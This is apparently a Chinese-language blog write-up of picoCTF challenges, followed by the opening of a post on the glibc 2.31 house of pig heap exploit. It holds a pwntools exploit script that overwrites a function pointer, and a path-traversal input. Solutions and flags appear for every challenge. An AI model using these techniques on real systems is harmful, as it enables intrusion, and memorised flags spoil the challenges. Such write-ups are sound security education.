 &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;ve failed this class.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hard_checker</span><span class="params">(<span class="type">char</span> *story, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (calculate_story_score(story, len) == <span class="number">13371337</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">char</span> buf[FLAGSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fgets(buf, FLAGSIZE, f); <span class="comment">// size bound read</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;re 13371337. Here&#x27;s the flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;ve failed this class.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> (*check)(<span class="type">char</span>*, <span class="type">size_t</span>) = hard_checker;</span><br><span class="line"><span class="type">int</span> fun[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> story[<span class="number">128</span>];</span><br><span class="line">  <span class="type">int</span> num1, num2;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me a story and then I&#x27;ll tell you if you&#x27;re a 1337 &gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%127s&quot;</span>, story);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;num1, &amp;num2);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (num1 &lt; <span class="number">10</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    fun[num1] += num2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check(story, <span class="built_in">strlen</span>(story));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Set the gid to the effective gid</span></span><br><span class="line">  <span class="comment">// this prevents /bin/sh from dropping the privileges</span></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要将函数指针check从hard_checker改为easy_checker。因为hard_checker会检查输入的story所有字节的ASCII码之和是否为13371337，由于输入长度有限，这显然不可能，而easy_checker则检查和是否为1337，可以实现。后面有一个在指定地址修改值的操作，使用负数绕过检查修改函数指针的值即可。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># io = process(&#x27;./vuln&#x27;)</span><br><span class="line">io = remote(&#x27;saturn.picoctf.net&#x27;, 54514)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;Tell me a story and then I\&#x27;ll tell you if you\&#x27;re a 1337 &gt;&gt; &#x27;, b&#x27;A&#x27; * 20 + b&#x27;%&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;On a totally unrelated note, give me two numbers. Keep the first one less than 10.&#x27;, b&#x27;-16 -314\n&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>picoCTF{0v3rwrit1ng_P01nt3rs_529bfb38}</p><h1 id="2-web-部分"><a href="#2-web-部分" class="headerlink" title="2. web 部分"></a>2. web 部分</h1><p>web没有系统学过，但是有的题过于简单，也能做。</p><h2 id="1-Includes"><a href="#1-Includes" class="headerlink" title="1. Includes"></a>1. Includes</h2><p>打开网页直接F12调出源码即可。</p><p>picoCTF{1nclu51v17y_1of2_f7w_2of2_df589022}</p><h2 id="2-Inspect-HTML"><a href="#2-Inspect-HTML" class="headerlink" title="2. Inspect HTML"></a>2. Inspect HTML</h2><p>打开网页直接F12调出HTML即可。</p><p>picoCTF{1n5p3t0r_0f_h7ml_1fd8425b}</p><h2 id="3-Local-Authority"><a href="#3-Local-Authority" class="headerlink" title="3. Local Authority"></a>3. Local Authority</h2><p>先随便输然后提交，报错之后直接F12调出源代码即可获取用户名为admin，密码为strongPassword098765。</p><p>picoCTF{j5_15_7r4n5p4r3n7_05df90c8}</p><h2 id="5-Forbidden-Paths"><a href="#5-Forbidden-Paths" class="headerlink" title="5. Forbidden Paths"></a>5. Forbidden Paths</h2><p>输入..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt即可，会进行读取。</p><p>picoCTF{7h3_p47h_70_5ucc355_6db46514}</p><h2 id="6-Power-Cookie"><a href="#6-Power-Cookie" class="headerlink" title="6. Power Cookie"></a>6. Power Cookie</h2><p>用burpsuite抓包之后把请求里面的isAdmin由0改为1发过去即可。</p><p>picoCTF{gr4d3_A_c00k13_5d2505be}</p><h1 id="3-reverse-部分"><a href="#3-reverse-部分" class="headerlink" title="3. reverse 部分"></a>3. reverse 部分</h1><p>会pwn，能看汇编，reverse多少应该也会点吧。</p><h2 id="1-file-run1"><a href="#1-file-run1" class="headerlink" title="1. file-run1"></a>1. file-run1</h2><p>打开IDA直接出flag。</p><p>picoCTF{U51N6_Y0Ur_F1r57_F113_9bc52b6b}</p><h2 id="2-file-run2"><a href="#2-file-run2" class="headerlink" title="2. file-run2"></a>2. file-run2</h2><p>同上。</p><p>picoCTF{F1r57_4rgum3n7_be0714da}</p><h2 id="3-GDB-Test-Drive"><a href="#3-GDB-Test-Drive" class="headerlink" title="3. GDB Test Drive"></a>3. GDB Test Drive</h2><p>main函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;A:4@r%uL5b3F88bC05C`Gb0`hf4bfg2N&quot;</span>);</span><br><span class="line">  sleep(<span class="number">0x186A0</span>u);</span><br><span class="line">  s = (<span class="type">char</span> *)rotate_encrypt(<span class="number">0LL</span>, v5);</span><br><span class="line">  <span class="built_in">fputs</span>(s, _bss_start);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那个乱码应该是加密之前的字符串，经过rotate_encrypt出flag。</p><p>rotate_encrypt函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title function_">rotate_encrypt</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">size_t</span> v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = strdup(a2);</span><br><span class="line">  v6 = <span class="built_in">strlen</span>(v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[i] &gt; <span class="number">32</span> &amp;&amp; v5[i] != <span class="number">127</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v5[i] + <span class="number">47</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 &lt;= <span class="number">126</span> )</span><br><span class="line">        v5[i] = v3;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v5[i] -= <span class="number">47</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密很简单，每个字节加47如果可打印就是这个，不可打印就在原来字节减47。在main函数里面有一个超长的等待，题目要我们用gdb可能是教我们怎么去跳过一个语句。按着题目的要求来就行了，也可以自己写脚本。</p><p>picoCTF{d3bugg3r_dr1v3_197c378a}</p><h2 id="4-patchme-py"><a href="#4-patchme-py" class="headerlink" title="4. patchme.py"></a>4. patchme.py</h2><p>打开patchme.py记下密码，然后运行输进去就行了。实际上加密也不难，可以自己写脚本或者直接给密码输入这个功能删掉直接解密。</p><p>ak98-&#x3D;90adfjhgj321sleuth9000</p><h2 id="5-Safe-Opener"><a href="#5-Safe-Opener" class="headerlink" title="5. Safe Opener"></a>5. Safe Opener</h2><p>一个java源文件，发现是base64加密，直接拖到在线解密网站去解密。</p><p>picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}</p><h2 id="6-unpackme-py"><a href="#6-unpackme-py" class="headerlink" title="6. unpackme.py"></a>6. unpackme.py</h2><p>将执行的代码用对称加密算法fernet算法加密。直接在源码中加一句print即可输出解密结果出flag。</p><p>picoCTF{175_chr157m45_5274ff21}</p><p>做到这都有点怀疑我到底是不是在做逆向题。</p><h2 id="7-bloat-py"><a href="#7-bloat-py" class="headerlink" title="7. bloat.py"></a>7. bloat.py</h2><p>给所有函数名改了，所有字符串改成索引的形式，但是还是能很快定位密码是happychance。输入之后出flag。</p><p>picoCTF{d30bfu5c4710n_f7w_b8062eec}</p><h1 id="4-Crypto-部分"><a href="#4-Crypto-部分" class="headerlink" title="4. Crypto 部分"></a>4. Crypto 部分</h1><h2 id="1-basic-mod1"><a href="#1-basic-mod1" class="headerlink" title="1. basic-mod1"></a>1. basic-mod1</h2><p>按照题目意思编写脚本即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">char_list = [<span class="number">54</span>,<span class="number">396</span>,<span class="number">131</span>,<span class="number">198</span>,<span class="number">225</span>,<span class="number">258</span>,<span class="number">87</span>,<span class="number">258</span>,<span class="number">128</span>,<span class="number">211</span>,<span class="number">57</span>,<span class="number">235</span>,<span class="number">114</span>,<span class="number">258</span>,<span class="number">144</span>,<span class="number">220</span>,<span class="number">39</span>,<span class="number">175</span>,<span class="number">330</span>,<span class="number">338</span>,<span class="number">297</span>,<span class="number">288</span>,]</span><br><span class="line">char_dict = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> char_list:</span><br><span class="line">    ref = char % <span class="number">37</span></span><br><span class="line">    flag += char_dict[ref]</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>picoCTF{R0UND_N_R0UND_79C18FB3}</p><h2 id="2-basic-mod2"><a href="#2-basic-mod2" class="headerlink" title="2. basic-mod2"></a>2. basic-mod2</h2><p>与上题类似，取逆元用sympy库的方法mod_inverse</p><p>picoCTF{1NV3R53LY_H4RD_C680BDC1}</p><h2 id="3-credstuff"><a href="#3-credstuff" class="headerlink" title="3. credstuff"></a>3. credstuff</h2><p>首先根据用户名找到密码：<br>cvpbPGS{P7e1S_54I35_71Z3}<br>这显然不是flag，首先猜测为凯撒密码。<br>位移13求出flag。<br>picoCTF{C7r1F_54V35_71M3}</p><h2 id="5-rail-fence"><a href="#5-rail-fence" class="headerlink" title="5. rail-fence"></a>5. rail-fence</h2><p>W型的栅栏密码，5列</p><p>WH3R3_D035_7H3_F3NC3_8361N_4ND_3ND_4A76B997</p><h2 id="6-substitution0"><a href="#6-substitution0" class="headerlink" title="6. substitution0"></a>6. substitution0</h2><p>一段文字，应该是替换密码。一个一个词判断就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">EKSZJTCMXOQUDYLFABGPHNRVIW </span><br><span class="line"></span><br><span class="line">Mjbjhfly Ujcbeyz eblgj, rxpm e cbenj eyz gpepjui exb, eyz kblhcmp dj pmj kjjpuj</span><br><span class="line">         Legrand arose, with a gra?e and statel? air, and brought me the beetle</span><br><span class="line">tbld e cuegg segj xy rmxsm xp reg jysulgjz. Xp reg e kjehpxthu gsebekejhg, eyz, ep</span><br><span class="line">from a glass case in which it was enclosed. It was a beautiful scarabaeus, and, at</span><br><span class="line">pmep pxdj, hyqylry pl yephbeuxgpg—lt slhbgj e cbjep fbxwj xy e gsxjypxtxs flxyp</span><br><span class="line">                                                    prize</span><br><span class="line">lt nxjr. Pmjbj rjbj prl blhyz kuesq gflpg yjeb lyj jvpbjdxpi lt pmj kesq, eyz e</span><br><span class="line">of view. There were two ro?n? black ????? near one extremity of</span><br><span class="line">ulyc lyj yjeb pmj lpmjb. Pmj gseujg rjbj jvsjjzxycui mebz eyz culggi, rxpm euu pmj</span><br><span class="line"></span><br><span class="line">effjebeysj lt khbyxgmjz cluz. Pmj rjxcmp lt pmj xygjsp reg njbi bjdebqekuj, eyz,</span><br><span class="line"></span><br><span class="line">peqxyc euu pmxycg xypl slygxzjbepxly, X slhuz mebzui kuedj Ohfxpjb tlb mxg lfxyxly</span><br><span class="line">                                                           Jupiter</span><br><span class="line">bjgfjspxyc xp.</span><br><span class="line"></span><br><span class="line">Pmj tuec xg: fxslSPT&#123;5HK5717H710Y_3N0UH710Y_59533E2J&#125;</span><br><span class="line">             picoCTF&#123;5UB5717U710N_3V0LU710N_59533A2E&#125;</span><br><span class="line">a-q</span><br><span class="line">b-r</span><br><span class="line">c-g</span><br><span class="line">d-m</span><br><span class="line">e-a</span><br><span class="line">f-p</span><br><span class="line">g-s</span><br><span class="line">h-u</span><br><span class="line">i-y</span><br><span class="line">j-e</span><br><span class="line">k-b</span><br><span class="line">l-o</span><br><span class="line">m-h</span><br><span class="line">n-v</span><br><span class="line">o-j</span><br><span class="line">p-t</span><br><span class="line">q-k</span><br><span class="line">r-w</span><br><span class="line">s-c</span><br><span class="line">t-f</span><br><span class="line">u-l</span><br><span class="line">v-x</span><br><span class="line">w-z</span><br><span class="line">x-i</span><br><span class="line">y-n</span><br><span class="line">z-d</span><br></pre></td></tr></table></figure><p>picoCTF{5UB5717U710N_3V0LU710N_59533A2E}</p><h2 id="7-substitutuion1"><a href="#7-substitutuion1" class="headerlink" title="7. substitutuion1"></a>7. substitutuion1</h2><p>同上，找不到JQXZ对应的字母，但是通过flag可以知道Q对应什么字母。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IECj (jqfue cfu ixzelus eqs coxa) xus x emzs fc ifrzlesu jsiludem ifrzsededfy. Ifyesjexyej xus zusjsyesk hdeq x jse fc iqxoosyasj hqdiq esje eqsdu iusxedgdem, esiqydixo (xyk affaodya) jpdooj, xyk zuftosr-jfogdya xtdodem. Iqxoosyasj ljlxoom ifgsu x ylrtsu fc ixesafudsj, xyk hqsy jfogsk, sxiq mdsokj x jeudya (ixoosk x coxa) hqdiq dj jltrdeesk ef xy fyodys jifudya jsugdis. IECj xus x ausxe hxm ef osxuy x hdks xuuxm fc ifrzlesu jsiludem jpdooj dy x jxcs, osaxo sygdufyrsye, xyk xus qfjesk xyk zoxmsk tm rxym jsiludem auflzj xuflyk eqs hfuok cfu cly xyk zuxiedis. Cfu eqdj zuftosr, eqs coxa dj: zdifIEC&#123;CU3NL3YIM_4774IP5_4U3_I001_4871S6CT&#125;</span><br><span class="line">CTFs (short for capture the flag) are a type of computer security competition. contestants are presented with a set of challenges which test their creativity, ????????? (??? ????????) skills, ??? problem-solving ???????. ?????????? ??????? ????? ? ?????? ?? ??????????, ??? ???? ??????, ???? ?????? ? ?????? (?????? ? ????) ????? ?? ????????? ?? ?? ?????? ??????? ???????. ???? ??? ? ????? ??? ?? ????? ? ???? ????? ?? ???????? ???????? ?????? ?? ? ????, ????? ???????????, ??? ??? ?????? ??? ?????? ?? ???? ???????? ?????? ?????? ??? ????? ??? ??? ??? ????????. ??? ???? ???????, ??? ???? ??: picoCTF&#123;???????????????????????????????????&#125;</span><br><span class="line">a b c d e f g h i j k l m n o p q r s t u v w x y z</span><br><span class="line">g ? f i t o v w c s d u y q l k h m e b r ? ? a n p</span><br></pre></td></tr></table></figure><p>picoCTF{FR3QU3NCY_4774CK5_4R3_C001_4871E6FB}</p><h2 id="8-substitution2"><a href="#8-substitution2" class="headerlink" title="8. substitution2"></a>8. substitution2</h2><p>这次没有分隔符了。但是还是一样。这次用脚本替换。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">gvjwjjoeugujajwqxzgvjwkjxxjugqfxeuvjivecvumvzzxmzbpsgjwujmswegrmzbpjgegezhuehmxsiehcmrfjwpqgwezgqhi</span><br><span class="line">sumrfjwmvqxxjhcjgvjujmzbpjgegezhunzmsupwebqwexrzhurugjbuqibeheugwqgezhnshiqbjhgqxukvemvqwjajwrsujns</span><br><span class="line">xqhibqwdjgqfxjudexxuvzkjajwkjfjxejajgvjpwzpjwpswpzujznqvecvumvzzxmzbpsgjwujmswegrmzbpjgegezheuhzgzh</span><br><span class="line">xrgzgjqmvaqxsqfxjudexxufsgqxuzgzcjgugsijhguehgjwjugjiehqhijomegjiqfzsgmzbpsgjwumejhmjijnjhueajmzbpj</span><br><span class="line">gegezhuqwjzngjhxqfzwezsuqnnqewuqhimzbjizkhgzwshhehcmvjmdxeuguqhijojmsgehcmzhnecumwepguznnjhujzhgvjz</span><br><span class="line">gvjwvqhieuvjqaexrnzmsujizhjopxzwqgezhqhiebpwzaeuqgezhqhizngjhvqujxjbjhguznpxqrkjfjxejajqmzbpjgegezh</span><br><span class="line">gzsmvehczhgvjznnjhueajjxjbjhguznmzbpsgjwujmswegreugvjwjnzwjqfjggjwajvemxjnzwgjmvjaqhcjxeubgzugsijhg</span><br><span class="line">uehqbjwemqhvecvumvzzxunswgvjwkjfjxejajgvqgqhshijwugqhiehcznznnjhueajgjmvhelsjueujuujhgeqxnzwbzshgeh</span><br><span class="line">cqhjnnjmgeajijnjhujqhigvqggvjgzzxuqhimzhnecswqgezhnzmsujhmzshgjwjiehijnjhueajmzbpjgegezhuizjuhzgxjq</span><br><span class="line">iugsijhgugzdhzkgvjewjhjbrqujnnjmgeajxrqugjqmvehcgvjbgzqmgeajxrgvehdxedjqhqggqmdjwpemzmgneuqhznnjhue</span><br><span class="line">ajxrzwejhgjivecvumvzzxmzbpsgjwujmswegrmzbpjgegezhgvqgujjdugzcjhjwqgjehgjwjugehmzbpsgjwumejhmjqbzhcv</span><br><span class="line">ecvumvzzxjwugjqmvehcgvjbjhzscvqfzsgmzbpsgjwujmswegrgzpelsjgvjewmswezuegrbzgeaqgehcgvjbgzjopxzwjzhgv</span><br><span class="line">jewzkhqhijhqfxehcgvjbgzfjggjwijnjhigvjewbqmvehjugvjnxqceupemzMGN&#123;H6W4B_4H41R515_15_73I10S5_8J1FN808&#125;</span><br><span class="line"></span><br><span class="line">thereexistseveralotherwellestablishedhighschoolcomputersecuritycompetitionsincludingcyberpatriotand</span><br><span class="line">uscyberchallengethesecompetitionsfocusprimarilyonsystemsadministrationfundamentalswhichareveryusefu</span><br><span class="line">landmarketableskillshoweverwebelievetheproperpurposeofahighschoolcomputersecuritycompetitionisnoton</span><br><span class="line">lytoteachvaluableskillsbutalsotogetstudentsinterestedinandexcitedaboutcomputersciencedefensivecompe</span><br><span class="line">titionsareoftenlaboriousaffairsandcomedowntorunningchecklistsandexecutingconfigscriptsoffenseontheo</span><br><span class="line">therhandisheavilyfocusedonexplorationandimprovisationandoftenhaselementsofplaywebelieveacompetition</span><br><span class="line">touchingontheoffensiveelementsofcomputersecurityisthereforeabettervehiclefortechevangelismtostudent</span><br><span class="line">sinamericanhighschoolsfurtherwebelievethatanunderstandingofoffensivetechniquesisessentialformountin</span><br><span class="line">ganeffectivedefenseandthatthetoolsandconfigurationfocusencounteredindefensivecompetitionsdoesnotlea</span><br><span class="line">dstudentstoknowtheirenemyaseffectivelyasteachingthemtoactivelythinklikeanattackerpicoctfisanoffensi</span><br><span class="line">velyorientedhighschoolcomputersecuritycompetitionthatseekstogenerateinterestincomputerscienceamongh</span><br><span class="line">ighschoolersteachingthemenoughaboutcomputersecuritytopiquetheircuriositymotivatingthemtoexploreonth</span><br><span class="line">eirownandenablingthemtobetterdefendtheirmachinestheflagispico???????????????????????????????????????</span><br></pre></td></tr></table></figure><p>picoCTF{N6R4M_4N41Y515_15_73D10U5_8E1BF808}</p><h2 id="9-transposition-trial"><a href="#9-transposition-trial" class="headerlink" title="9. transposition-trial"></a>9. transposition-trial</h2><p>移位密码，3字节一组。</p><p>picoCTF{7R4N5P051N6_15_3XP3N51V3_56E6924A}</p><h2 id="10-Vigenere"><a href="#10-Vigenere" class="headerlink" title="10. Vigenere"></a>10. Vigenere</h2><p>维吉尼亚密码。key &#x3D; CYLAB</p><p>picoCTF{D0NT_US3_V1G3N3R3_C1PH3R_ae82272q}</p><h1 id="5-Forensics-部分"><a href="#5-Forensics-部分" class="headerlink" title="5. Forensics 部分"></a>5. Forensics 部分</h1><p>这个部分应该是杂项。</p><h2 id="1-Enhance"><a href="#1-Enhance" class="headerlink" title="1. Enhance!"></a>1. Enhance!</h2><p>浏览器打开svg然后F12调源码。</p><p>picoCTF{3nh4nc3d_aab729dd}</p><h2 id="3-Lookey-here"><a href="#3-Lookey-here" class="headerlink" title="3. Lookey here"></a>3. Lookey here</h2><p>字符串查找完事。</p><p>picoCTF{gr3p_15_@w3s0m3_4c479940}</p><h2 id="4-Packets-primer"><a href="#4-Packets-primer" class="headerlink" title="4. Packets primer"></a>4. Packets primer</h2><p>Wireshark。</p><p>picoCTF{p4ck37_5h4rk_ceccaa7f}</p><h2 id="5-Redaction-gone-wrong"><a href="#5-Redaction-gone-wrong" class="headerlink" title="5. Redaction gone wrong"></a>5. Redaction gone wrong</h2><p>选中复制就行了。</p><p>picoCTF{C4n_Y0u_S33_m3_fully}</p><h2 id="6-Sleuthkit-Intro"><a href="#6-Sleuthkit-Intro" class="headerlink" title="6. Sleuthkit Intro"></a>6. Sleuthkit Intro</h2><p>mmls获取信息之后nc填进去就行了</p><p>picoCTF{mm15_f7w!}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc 2.31 pwn——house of pig原题分析与示例程序</title>
      <link href="/2023/02/28/glibc-2-31-pwn%E2%80%94%E2%80%94house-of-pig%E5%8E%9F%E9%A2%98%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/02/28/glibc-2-31-pwn%E2%80%94%E2%80%94house-of-pig%E5%8E%9F%E9%A2%98%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>house of pig这种利用方式来源于XCTF 2021 final中的同名题，其原题使用的是libc 2.31版本，本文就根据这道题学习一下这种漏洞利用方式。</p><p><a href="https://www.anquanke.com/post/id/242640#h3-6">参考资料</a></p><p>这是一道C++ pwn，但漏洞本身与C++不同于C的特性关系不大。</p><p>一共提供了5个选项：</p><p><img src="https://img-blog.csdnimg.cn/ef2e43c501774e869c2351c9f08673d9.png"><br>增，删，改，看，修改用户。我们一个一个来看。</p><h1 id="1-逆向分析"><a href="#1-逆向分析" class="headerlink" title="1. 逆向分析"></a>1. 逆向分析</h1><h2 id="A-add-message"><a href="#A-add-message" class="headerlink" title="A. add message"></a>A. add message</h2><p>除了修改用户之外，其他4个选项的具体操作因用户而异，一共有3个用户，peppa、mummy和daddy，对于add message操作而言，3个用户的操作基本相同，只有几个地方有差别。</p><p><img src="https://img-blog.csdnimg.cn/52b3aad7e5414a09a652719d9e05208c.png"><br>上图是peppa的add message函数，peppa可以遍历0~19的索引，并添加一个大小在0x90~0x430的chunk，在mummy的add函数中只能遍历0<del>\9的索引，并添加大小在0x90\</del>0x450的chunk。<strong>对于peppa和mummy，其分配的chunk大小只能一次比一次大或者本次与上一次相等，daddy则没有这个限制</strong>。对于daddy，则是0~4的索引和0x90~0x440的chunk。另外，<strong>在daddy函数中如果添加chunk的索引为4，则还可以再分配一个大小为0xE8的chunk并写入最大长度为0xE8的内容。</strong> 